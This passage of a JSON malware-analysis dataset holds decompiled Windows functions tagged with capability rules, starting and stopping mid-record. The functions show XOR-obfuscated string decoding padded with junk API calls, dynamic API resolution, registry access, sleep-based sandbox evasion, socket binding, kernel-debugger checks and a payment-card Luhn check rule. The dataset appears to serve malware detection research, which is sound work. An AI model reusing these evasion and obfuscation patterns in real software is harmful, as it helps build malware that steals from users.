        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040a118(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint *in_EDX;\n    int32_t iVar6;\n    uint *puVar7;\n    uchar *puVar8;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    int32_t lpModuleName;\n    int32_t var_10h;\n    uchar *var_ch;\n    int32_t var_8h;\n    \n    var_8h = 0;\n    var_ch = NULL;\n    var_38h = 0xf034404;\n    puVar7 = &var_54h;\n    var_1ch = in_EDX;\n    for (iVar5 = 0x18; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_34h = 0x5c0e6655;\n    puVar7 = &var_2ch;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &var_24h;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_30h = CONCAT22(var_30h._2_2_, 0x630b);\n    var_24h = 0x6367306a;\n    var_20h._0_2_ = 0x4839;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_10h = 6;\n    iVar6 = 0;\n    lpModuleName = iVar5;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar3 != 0xea05b6) {\n            *(iVar6 + iVar5) = *(&var_24h + iVar6 % var_10h) ^ (iVar6 + iVar5)[&var_38h - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 10);\n    var_3ch = 0x1c302602;\n    var_38h = 0x3738191f;\n    var_34h = 0xc190b20;\n    var_30h = 0x6e1d3d25;\n    var_24h = 0x6e73524c;\n    var_20h._0_2_ = 0x787a;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar6 = 0;\n    var_18h = &var_3ch - iVar5;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetFocus)();\n        if (iVar3 != 0x1cd7ff) {\n            *(iVar6 + iVar5) = *(&var_24h + iVar6 % var_10h) ^ (iVar6 + iVar5)[&var_3ch - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x10);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar5);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    var_48h = 0x40;\n    var_54h = 0x18;\n    var_50h = 0;\n    var_4ch = 0;\n    var_44h = 0;\n    var_40h = 0;\n    iVar6 = (*pcVar4)(&var_8h, 0xf001f, &var_54h, &var_2ch, 0x40, 0x8000000, 0);\n    if (iVar6 < 0) {\n        iVar6 = fcn.00409c14();\n    }\n    else {\n        iVar6 = fcn.00409e74(&var_ch);\n        puVar8 = var_ch;\n        var_10h = iVar6;\n        if (iVar6 == 0) {\n            for (; var_2ch != 0; var_2ch = var_2ch + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n            *var_1ch = var_ch;\n            if (arg_8h != NULL) {\n                *arg_8h = var_8h;\n            }\n        }\n    }\n    if ((var_8h != 0) && (arg_8h == NULL)) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_8h);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, lpModuleName);\n    (*pcVar4)(uVar2);\n    return iVar6;\n}\n",
        "token_count": 1389
    },
    "0040b3b0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040b3b0(void)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    puVar9 = &var_20h;\n    for (iVar7 = 8; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_2ch = 0xf034404;\n    var_28h = 0x5c0e6655;\n    var_24h = CONCAT22(var_24h._2_2_, 0x630b);\n    var_18h = 0x6367306a;\n    var_14h._0_2_ = 0x4839;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    lpModuleName = iVar7;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar4 != 0xea05b6) {\n            var_8h = 6;\n            *(iVar8 + iVar7) = *(&var_18h + iVar8 % 6) ^ (iVar8 + iVar7)[&var_2ch - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_30h = 0x351a3508;\n    var_2ch = 0x331372b;\n    var_28h = 0x33192102;\n    var_24h = 0x5a764515;\n    var_18h = 0x7676415a;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x44);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_8h = &var_30h - iVar7;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        iVar4 = lpModuleName;\n        if (iVar5 != 0xe6d2a3) {\n            var_8h = 5;\n            *(iVar8 + iVar7) = *(&var_18h + iVar8 % 5) ^ (iVar8 + iVar7)[&var_30h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x10);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar7);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    cVar2 = fcn.0040a969();\n    if (cVar2 != '\\0') {\n        var_4h = (*pcVar6)(0, var_1ch, var_20h);\n    }\n    fcn.00408e0c();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar1)(0, iVar4);\n    (*pcVar6)(uVar3);\n    return var_4h;\n}\n",
        "token_count": 966
    },
    "0040b8c7": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040b8c7(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0;\n    var_4h = *0x41cb5c;\n    fcn.00409d4f();\n    uVar2 = fcn.00409d4f();\n    iVar3 = fcn.0040b50c(uVar2 & 0xff, 0x41cb5c, 0x41cb60, &var_8h);\n    if (iVar3 != 0) {\n        iVar3 = fcn.0040b50c(0, 0x41cb5c, 0x41cb64, &var_8h);\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (iVar3 != 0) {\n            var_28h = 0x331c6f1c;\n            var_24h = 0x790a3237;\n            var_20h._0_2_ = 0x4f33;\n            var_1ch = 0x33796f32;\n            var_18h._0_1_ = 0x4f;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar6 = 0;\n            var_14h = &var_28h - iVar3;\n            do {\n                iVar5 = (*pcVar1)();\n                if (iVar5 != 0x3bdedd) {\n                    var_10h = 5;\n                    *(iVar6 + iVar3) = *(&var_1ch + iVar6 % 5) ^ (iVar6 + iVar3)[var_14h];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 10);\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(*0x41cb64, iVar3);\n            iVar6 = fcn.0040b50c(0, 0x41cb5c, 0x41cb74, &var_8h);\n            if (iVar6 != 0) {\n                var_4h = var_4h ^ 0x29787279;\n                var_4h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                iVar6 = fcn.0040b50c(0, &var_4h, 0x41cb68, &var_8h);\n                if (iVar6 != 0) {\n                    var_ch = 1;\n                }\n            }\n            uVar4 = (*pcVar1)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 735
    },
    "0040ba16": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040ba16(void)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uchar *puVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    int16_t *piVar8;\n    code *pcVar9;\n    int32_t iVar10;\n    int32_t iStack1444;\n    uint uStack1440;\n    uint uStack1436;\n    uchar *puStack1432;\n    uint uStack1428;\n    uint uStack1424;\n    uint uStack1420;\n    uint uStack1416;\n    code *pcStack1412;\n    uchar *puStack1408;\n    uchar *puStack1404;\n    int32_t iStack1400;\n    uint uStack1396;\n    uint uStack1392;\n    uchar *puStack1388;\n    uchar *puStack1384;\n    uint uStack1380;\n    uint uStack1376;\n    int32_t iStack1372;\n    uchar *puStack1368;\n    uint uStack1364;\n    uint uStack1360;\n    uchar uStack1356;\n    uchar uStack1355;\n    ushort uStack1354;\n    uint8_t uStack1352;\n    ushort uStack1351;\n    uchar uStack1349;\n    uint uStack1348;\n    uchar *puVar11;\n    uint uStack1332;\n    uint uStack1328;\n    uint uStack1324;\n    uint uStack1320;\n    uchar uStack1316;\n    uchar uStack1315;\n    ushort uStack1314;\n    ushort uStack1312;\n    uchar uStack1310;\n    uchar uStack1309;\n    uchar uStack1308;\n    int32_t iStack1304;\n    uchar *puStack1292;\n    uint uStack1288;\n    uchar *puStack1284;\n    uint uStack1280;\n    uint uStack1276;\n    uint uStack1272;\n    int32_t iStack1268;\n    uint uStack1264;\n    uint uStack1260;\n    uint uStack1256;\n    uchar uStack1252;\n    uint uStack1251;\n    uint uStack1247;\n    uint uStack1243;\n    uint uStack1239;\n    uint uStack1235;\n    uint uStack1231;\n    uint uStack1227;\n    uint uStack1223;\n    uint uStack1219;\n    uint uStack1215;\n    uint uStack1211;\n    uint uStack1207;\n    uint uStack1203;\n    uchar uStack1199;\n    uint32_t uStack1196;\n    int32_t iStack1192;\n    uint uStack1172;\n    int32_t iStack1160;\n    uchar auStack1148 [8];\n    uint uStack1140;\n    int16_t iStack1136;\n    uchar auStack1134 [22];\n    uchar auStack1112 [4];\n    uchar auStack1108 [40];\n    uchar auStack1068 [36];\n    uchar auStack1032 [1028];\n    \n    pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uStack1140 = 0x200;\n    uStack1320 = 0x361a0102;\n    puVar5 = &stack0xfffffbf8;\n    for (iVar7 = 0x400; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    uStack1316 = 8;\n    puVar5 = &stack0xfffffb90;\n    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    uStack1314 = 0x5a57;\n    uStack1312 = 0x976;\n    puVar5 = &stack0xfffffbd4;\n    for (iVar7 = 0x24; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    uStack1348 = 0xe;\n    uStack1352 = 8;\n    uStack1351 = 0;\n    uStack1349 = 0;\n    uStack1256 = 5;\n    uStack1315 = 5;\n    uStack1309 = 8;\n    uStack1308 = 0x68;\n    iStack1268 = 0x58686469;\n    uStack1264 = CONCAT31(uStack1264._1_3_, 0x6d);\n    uStack1356 = 0x9c;\n    uStack1355 = 0xba;\n    uStack1354 = 0x40;\n    uStack1310 = uStack1315;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack1356 = uVar2;\n    uStack1355 = uVar2 >> 8;\n    uStack1354 = uVar2 >> 0x10;\n    uStack1360 = 0x40baa3;\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    uStack1264 = 0;\n    iVar10 = 0;\n    puStack1292 = &stack0xfffffacc + -iVar7;\n    iStack1160 = iVar7;\n    do {\n        uStack1360 = 0x40bac4;\n        iVar3 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        if (iVar3 != 0xbd5435) {\n            *(iVar10 + iVar7) = (&stack0xfffffb00)[iVar10 % iStack1268] ^ (iVar10 + iVar7)[puStack1292];\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 0xd);\n    uStack1360 = 0x15;\n    uStack1364 = 8;\n    uStack1332 = 0x1f26100e;\n    uStack1328 = 0x3200712;\n    uStack1324 = 0xa0237;\n    uStack1320 = 0x183f103d;\n    uStack1316 = 0x1d;\n    uStack1315 = 0x15;\n    uStack1314 = 0x7526;\n    puStack1368 = 0x40bb25;\n    puStack1368 = (*pcVar9)();\n    iStack1372 = 0x40bb2c;\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iStack1304 = 6;\n    iVar10 = 0;\n    puStack1284 = &stack0xfffffac0 + -iVar7;\n    puStack1292 = iVar7;\n    do {\n        iStack1372 = 0x40bb4e;\n        iVar3 = (*_sym.imp.USER32.dll_GetCursor)();\n        if (iVar3 != 0x64e83d) {\n            *(iVar10 + iVar7) = (&stack0xfffffab8)[iVar10 % iStack1304] ^ (iVar10 + iVar7)[puStack1284];\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 0x14);\n    uStack1376 = uStack1172;\n    uStack1380 = 0x40bb81;\n    iStack1372 = iVar7;\n    uStack1380 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    puStack1384 = 0x40bb88;\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    uStack1172 = 0x40;\n    puStack1384 = &stack0xfffffb6c;\n    puStack1388 = 0x40bba3;\n    (*_sym.imp.KERNEL32.dll_GlobalMemoryStatusEx)();\n    puStack1388 = &stack0xfffffbac;\n    if (pcVar4 == NULL) {\n        uStack1392 = 0x40bbb9;\n        (*_sym.imp.KERNEL32.dll_GetSystemInfo)();\n    }\n    else {\n        uStack1392 = 0x40bbb1;\n        (*pcVar4)();\n    }\n    uStack1392 = 0xbd;\n    uStack1396 = 8;\n    puStack1292 = 0x6b18491f;\n    uStack1288 = 0x792d571f;\n    puStack1284 = 0x49366d1c;\n    uStack1280 = 0x57086b0b;\n    uStack1276 = 0x6d2f7915;\n    uStack1272 = 0x6b2a4912;\n    iStack1268 = 0x791b572e;\n    uStack1264 = 0x49076d22;\n    uStack1260 = 0x57246b2d;\n    uStack1256 = 0x6d257906;\n    uStack1252 = 0xb;\n    uStack1251 = 0x146b2a49;\n    uStack1247 = 0x1f793a57;\n    uStack1243 = 0x1449326d;\n    uStack1239 = 0xa57316b;\n    uStack1235 = 0x396d0e79;\n    uStack1231 = 0x1f6b0d49;\n    uStack1227 = 0x7792857;\n    uStack1223 = 0xb49076d;\n    uStack1219 = 0x2a57026b;\n    uStack1215 = 0x246d0e79;\n    uStack1211 = 0x26b0a49;\n    uStack1207 = 0x37793b57;\n    uStack1203 = 0x7949676d;\n    uStack1199 = 0x6b;\n    uStack1320 = 0x6b794957;\n    uStack1316 = 0x6d;\n    iStack1400 = 0x40bccc;\n    iStack1400 = (*pcVar9)();\n    puStack1404 = 0x40bcd3;\n    puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iVar7 = 0;\n    puVar6 = &stack0xfffffae8 + -puVar5;\n    uStack1316 = SUB41(puVar6, 0);\n    uStack1315 = puVar6 >> 8;\n    uStack1314 = puVar6 >> 0x10;\n    puVar11 = puVar5;\n    do {\n        puStack1404 = 0x40bcef;\n        iVar10 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        if (iVar10 != 0x4ff9ef) {\n            puVar5[iVar7] =\n                 (&stack0xfffffacc)[iVar7 % CONCAT13(uStack1309, CONCAT12(uStack1310, uStack1312))] ^\n                 (puVar5 + iVar7)[puVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x5e);\n    puStack1404 = &stack0xfffffb50;\n    pcStack1412 = reloc.WS2_32.dll_bind;\n    uStack1416 = 0x40bd23;\n    puStack1408 = puVar5;\n    iVar7 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyW)();\n    uVar2 = CONCAT31(uStack1215, uStack1219._3_1_);\n    pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar7 == 0) {\n        uStack1416 = 0x51;\n        uStack1420 = 8;\n        puStack1388 = 0x421d3719;\n        puStack1384 = 0x6f544937;\n        uStack1380 = 0x373a5827;\n        uStack1376 = 0x4937421c;\n        iStack1372 = 0x580c6f45;\n        puStack1368 = 0x42023728;\n        uStack1364 = 0x6f64493d;\n        uStack1360 = 0x373b5836;\n        uStack1356 = 6;\n        uStack1355 = 0x42;\n        uStack1354 = 0x4936;\n        uStack1352 = 0x50;\n        uStack1351 = 0x426f;\n        uStack1349 = 0x58;\n        uStack1396 = 0x426f3749;\n        uStack1392 = CONCAT31(uStack1392._1_3_, 0x58);\n        uStack1424 = 0x40bdaa;\n        uStack1424 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        uStack1428 = 0x40bdb1;\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n        iVar10 = 0;\n        uStack1356 = iVar7;\n        uStack1355 = iVar7 >> 8;\n        uStack1354 = iVar7 >> 0x10;\n        do {\n            uStack1428 = 0x40bdcd;\n            iVar3 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n            if (iVar3 != 0x837125) {\n                *(iVar10 + iVar7) = (&stack0xfffffa80)[iVar10 % puVar11] ^ (iVar10 + iVar7)[&stack0xfffffa88 + -iVar7];\n            }\n            iVar10 = iVar10 + 1;\n        } while (iVar10 < 0x28);\n        uStack1428 = &stack0xfffffb3c;\n        puStack1432 = &stack0xfffffba8;\n        uStack1436 = 0;\n        uStack1440 = 0;\n        iStack1444 = iVar7;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(CONCAT31(uStack1223, uStack1227._3_1_));\n        piVar8 = &stack0xfffffb90;\n        do {\n            iVar1 = *piVar8;\n            piVar8 = piVar8 + 1;\n        } while (iVar1 != CONCAT11(uStack1355, uStack1356));\n        pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n        if (piVar8 - &stack0xfffffb92 >> 1 != 0) {\n            uStack1424 = 0x4d5d4219;\n            uStack1420 = 0x382c4104;\n            uStack1416 = CONCAT22(uStack1416._2_2_, 0x6b4d);\n            puStack1432 = 0x4d384241;\n            uStack1428 = CONCAT31(uStack1428._1_3_, 0x6b);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar7 = 0;\n            puStack1368 = &stack0xfffffa64 + -iVar10;\n            do {\n                iVar3 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n                if (iVar3 != 0x6f2a0b) {\n                    *(iVar7 + iVar10) =\n                         (&stack0xfffffa5c)[iVar7 % iStack1372] ^ (iVar7 + iVar10)[&stack0xfffffa64 + -iVar10];\n                }\n                pcVar9 = _sym.imp.SHLWAPI.dll_StrStrIW;\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 10);\n            iVar3 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(&stack0xfffffb84, iVar10);\n            iVar7 = iStack1400;\n            while (iVar3 != 0) {\n                (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n                iVar3 = (*pcVar9)(&stack0xfffffb78, iVar10);\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar10);\n            pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        puVar5 = puStack1384;\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(CONCAT31(uStack1247, uStack1251._3_1_));\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        (*pcVar9)(uVar2);\n        uVar2 = CONCAT31(uStack1215, uStack1219._3_1_);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    }\n    while ((_sym.imp.KERNEL32.dll_GetProcessHeap = pcVar4,  iStack1192 == 0 && (uStack1196 < 2100000000))) {\n        uStack1416 = 0x2710;\n        uStack1420 = 0x40bf35;\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n        pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    }\n    uStack1420 = 0;\n    uStack1424 = 0x40bf5d;\n    uStack1416 = puVar5;\n    uStack1424 = (*pcVar4)();\n    uStack1428 = 0x40bf60;\n    (*pcVar9)();\n    uStack1428 = uStack1348;\n    puStack1432 = NULL;\n    uStack1436 = 0x40bf69;\n    uStack1436 = (*pcVar4)();\n    uStack1440 = 0x40bf6c;\n    (*pcVar9)();\n    iStack1444 = 0;\n    uStack1440 = uVar2;\n    uVar2 = (*pcVar4)();\n    (*pcVar9)(uVar2);\n    return;\n}\n",
        "token_count": 4090
    },
    "0040bfa3": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint32_t fcn.0040bfa3(void)\n\n{\n    ushort uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint uStack488;\n    uint uStack484;\n    uint uStack480;\n    uchar *puStack476;\n    uint32_t uVar8;\n    uchar auStack408 [404];\n    \n    puStack476 = &stack0xfffffe68;\n    uVar7 = 0;\n    uStack480 = 0x202;\n    uStack484 = 0x40bfc4;\n    (*_sym.imp.WS2_32.dll_WSAStartup)();\n    uStack484 = 0;\n    uStack488 = 1;\n    uVar2 = (*_sym.imp.WS2_32.dll_socket)(2);\n    if (uVar2 != 0xffffffff) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        uVar7 = iVar3 + 2000U & 0xffff;\n        uVar2 = 0;\n        if (uVar7 < 64000) {\n            uVar8 = 0x405d7e58;\n            puStack476 = 0x74726e6d;\n            do {\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                iVar6 = 0;\n                uVar7 = uVar8;\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n                    if (iVar5 != 0x710148) {\n                        *(iVar6 + iVar3) = (&stack0xfffffe18)[iVar6 % 6] ^ (iVar6 + iVar3)[&stack0xfffffe20 + -iVar3];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 10);\n                (*_sym.imp.WS2_32.dll_inet_addr)(iVar3);\n                uVar1 = (*_sym.imp.WS2_32.dll_ntohs)(uVar7);\n                uVar8 = CONCAT22(uVar1, 2);\n                iVar6 = (*_sym.imp.WS2_32.dll_bind)(0x7443, &stack0xfffffe30, 0x10);\n                if (iVar6 == 0) {\n                    (*_sym.imp.WS2_32.dll_closesocket)(0x7443);\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    break;\n                }\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                uVar7 = uVar7 + 1;\n                uVar2 = 0;\n            } while (uVar7 < 64000);\n        }\n    }\n    return uVar2 & 0xffff0000 | uVar7 & 0xffff;\n}\n",
        "token_count": 711
    },
    "00404313": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00404313(char *param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = 0xffffffff;\n    if (param_2 != 0) {\n        do {\n            uVar4 = *param_1;\n            param_2 = param_2 + -1;\n            param_1 = param_1 + 1;\n            iVar2 = 8;\n            do {\n                uVar1 = uVar4 ^ uVar3;\n                uVar3 = uVar3 >> 1;\n                if ((uVar1 & 1) != 0) {\n                    uVar3 = uVar3 ^ 0xedb88320;\n                }\n                uVar4 = uVar4 >> 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        } while (param_2 != 0);\n    }\n    return uVar3;\n}\n",
        "token_count": 235
    },
    "00404e21": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00404e21(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t iVar4;\n    int32_t lpBuffer;\n    int32_t lpNumberOfBytesRead;\n    uint lpFileName;\n    int32_t lDistanceToMove;\n    int32_t var_4h;\n    \n    iVar4 = 0;\n    var_4h = 0;\n    iVar2 = fcn.00405d04();\n    if (iVar2 == 0) {\n        iVar2 = fcn.004014f8(extraout_ECX);\n        if ((iVar2 != 0) && (lDistanceToMove = fcn.0040157e(),  lDistanceToMove != 0)) {\n            cVar1 = '\\0';\n            if (((*0x41cb1c & 1) != 0) && (*(*(param_1 + 0x3c) + 4 + param_1) == 0x14c)) {\n                cVar1 = fcn.00404ca4();\n                cVar1 = '\\x01' - (cVar1 != '\\0');\n            }\n            iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x80000000, 1, 0, 3, 0x80, 0);\n            if (iVar4 != -1) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(iVar4, lDistanceToMove, 0, 0);\n                if (((iVar2 == lDistanceToMove) &&\n                    (iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar4, &lpBuffer, 4, &lpNumberOfBytesRead, 0), \n                    iVar2 != 0)) && (lpNumberOfBytesRead == 4)) {\n                    var_4h = lpBuffer + param_1;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n            }\n            iVar4 = var_4h;\n            if (cVar1 != '\\0') {\n                fcn.00404ca4();\n                iVar4 = var_4h;\n            }\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return iVar4;\n}\n",
        "token_count": 540
    },
    "0040a452": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040a452(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if ((arg_8h & 0x20006) == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000001);\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(0x80000001);\n    }\n    uVar2 = 0;\n    if (iVar1 == 0) {\n        uVar2 = arg_8h;\n    }\n    return uVar2;\n}\n",
        "token_count": 151
    },
    "00405c35": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
